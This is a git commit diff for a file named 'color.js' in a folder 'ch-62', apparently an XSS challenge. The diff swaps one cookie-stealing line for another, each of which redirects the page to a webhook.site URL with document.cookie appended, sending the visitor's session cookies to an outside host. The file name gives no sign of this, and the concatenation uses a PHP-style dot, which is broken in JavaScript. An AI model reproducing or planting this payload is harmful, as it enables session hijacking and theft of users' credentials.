4b45e98cdb2ec5109def37e6fa710604d62afa42
botdevphone-jpg <botdevphone@gmail.com>
2026-02-01 16:17:38 +0300

    Update color.js

--- ch-62/color.js
+++ ch-62/color.js
@@ -1,1 +1,1 @@
-document.location="http://webhook.site/3f49d0dd-56df-4a4d-951d-83862257fa1d&c=".document.cookie;
+document.location="https://webhook.site/b72dfd78-3a9e-4a34-81a2-54d92c8c143c&c=".document.cookie;
